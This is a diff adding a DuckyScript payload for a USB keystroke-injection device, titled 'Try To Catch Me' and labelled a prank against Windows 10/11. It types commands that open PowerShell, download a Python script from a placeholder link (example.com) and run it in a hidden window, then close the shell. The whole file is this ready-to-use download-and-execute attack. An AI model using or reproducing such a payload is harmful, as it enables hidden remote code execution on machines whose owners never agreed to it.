@@ -1,0 +1,32 @@
+REM ####################################
+REM #                                  |
+REM # Title        : Try To Catch Me   |
+REM # Author       : Aleff             |
+REM # Version      : 1.0               |
+REM # Category     : Prank             |
+REM # Target       : Windows 10/11     |
+REM #                                  |
+REM ####################################
+
+
+REM Requirements:
+REM     - Python
+REM     - Internet Connection
+
+REM REQUIRED - Set your Python script link
+DEFINE #SCRIPT-PY-LINK example.com
+
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 500
+
+STRINGLN Invoke-WebRequest -Uri "#SCRIPT-PY-LINK" -OutFile "script.py"
+DELAY 500
+
+STRINGLN Start-Process python.exe -ArgumentList "script.py" -WindowStyle Hidden
+DELAY 1000
+ALT F4
